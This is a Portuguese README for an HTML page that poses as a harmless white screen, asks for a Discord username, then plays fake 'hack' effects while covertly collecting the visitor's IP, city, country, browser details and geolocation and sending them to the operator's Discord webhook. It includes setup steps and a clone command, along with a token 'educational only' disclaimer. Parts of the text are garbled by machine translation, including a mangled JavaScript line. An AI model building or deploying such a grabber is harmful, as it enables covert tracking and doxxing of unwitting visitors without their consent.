📌 LEIA-ME - Coletor de Dados do Discord
Um projeto HTML que simula uma tela de “hack” e coleta de informações do usuário, enviando-as para um webhook do Discord.

🚀 Funcionalidades
✅ Coleta de dados do usuário (IP, localização, navegador, sistema)
✅ Tela de "hack" com efeitos visuais (Matrix, piscar de tela, glitch)
✅ Envio automático para webhook do Discord
✅ Pergunta o nome do Discord antes de mostrar a tela de hack
✅ Design inicial normal (branco) para parecer inofensivo

🛠️ Como Usar
1️⃣ Pré-requisitos
Um servidor web (ou abrir o arquivo diretamente no navegador)
Um webhook do Discord válido (para receber os dados)
2️⃣ Configuração
Substitua o webhook pelo código:

JavaScript
1 linhas
Clique para expandir
resposta const = aguarda busca ('SEU_WEBHOOK_AQUI', {
(Substitua SEU_WEBHOOK_AQUIpelo seu webhook do Discord.)

Salve como index.htmle abra no navegador.

🔍 O que o Código Faz?
📌 Fluxo do Programa
Pergunta o nome do Discord (tela branca normal).
Ao enviar o nome, aparece a tela de "hack" (efeitos visuais).
Coleta automaticamente:
IP, cidade, país
Navegador, resolução, idioma
Latitude e longitude (se permitido)
Envie tudo para o webhook do Discord.
⚠️ Avisos Legais
Este projeto é apenas para fins educacionais.
Não use para atividades maliciosas.
Sempre solicite autorização antes de coletar dados de alguém.
📥 Download e Execução
festança

Correr
Copiar código
git clone https://github.com/draxlimp/NOVIDADES-.git
cd discord-data-collector
Abra index.htmlno navegador.

📌 Exemplo de Saída no Discord
Incorporar do Discord com dados coletados

👨‍💻 Autor: [Carroça]
🔗 Licença: Carroça
  💬 Contato: [1v1.lol1]

🌟 Dica: Se quiser aprimorar, adicionar mais efeitos ou integrar APIs de geolocalização mais precisas.

